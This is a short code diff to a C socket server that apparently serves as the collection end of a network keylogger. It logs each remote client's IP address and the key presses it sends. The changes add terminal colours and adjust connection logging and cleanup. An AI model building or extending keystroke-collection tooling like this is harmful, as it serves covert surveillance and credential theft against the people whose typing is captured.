@@ -13,6 +13,12 @@
 #include <string.h>
 #include <arpa/inet.h>
 
+#define RED   "\x1B[31m"
+#define YEL   "\x1B[33m"
+#define BLU   "\x1B[34m"
+#define GRN   "\x1B[32m"
+#define RESET "\x1B[0m"
+
 #define SERVER_PORT 12345
 
 #define MAX_KEYBOARD_EVENTS 10
@@ -86,7 +92,7 @@ int main(int argc, char **argv)
   /* Set up infinite poll timeout */
   timeout = -1;
 
-  printf("Server is running\n\n");
+  printf(RED"Server is running..\n\n"RESET);
   /* Accept new connections or read from ready sockets */
   do
   {
@@ -131,11 +137,11 @@ int main(int argc, char **argv)
 
           /* Add the new incoming connection to the pollfd struct */
           char *client_ip = inet_ntoa(client_addr.sin_addr);
-          printf("New incoming connection ip: %s - fd: %d\n", client_ip, fds[i].fd);
           fds[nfds].fd = new_sd;
           fds[nfds].events = POLLIN;
           client_addresses[nfds] = malloc(strlen(client_ip) + 1);
           strncpy(client_addresses[nfds], client_ip, strlen(client_ip) + 1);
+          printf("New incoming connection "BLU"IP: %s - "GRN"fd: %d\n"RESET, client_ip, fds[nfds].fd);
           nfds++;
 
         } while (new_sd != -1);
@@ -162,7 +168,7 @@ int main(int argc, char **argv)
 
           /* Reading keyboard press events */
           for (ssize_t j = 0; j < bytes_read / event_size; j++)
-            printf("Ip: %s - Time:%ld - Key:%s\n", client_addresses[i], kbd_events[j].time.tv_sec, keycodes[kbd_events[j].code]);
+            printf(BLU"IP: %s - "YEL"Time: %ld - "RED"Key: %s\n"RESET, client_addresses[i], kbd_events[j].time.tv_sec, keycodes[kbd_events[j].code]);
 
           /*If client closed connection*/
           if (!bytes_read)
@@ -217,11 +223,11 @@ int main(int argc, char **argv)
   /* Clean up all of the sockets that are open */
   for (int i = 0; i < nfds; i++)
   {
-    if (client_addresses[i] != NULL)
-      free(client_addresses[i]);
-
-    if (fds[i].fd >= 0)
-      close(fds[i].fd);
+      if (fds[i].fd >= 0)
+      {
+        close(fds[i].fd);
+        free(client_addresses[i]);
+      }
   }
 
   exit(EXIT_SUCCESS);
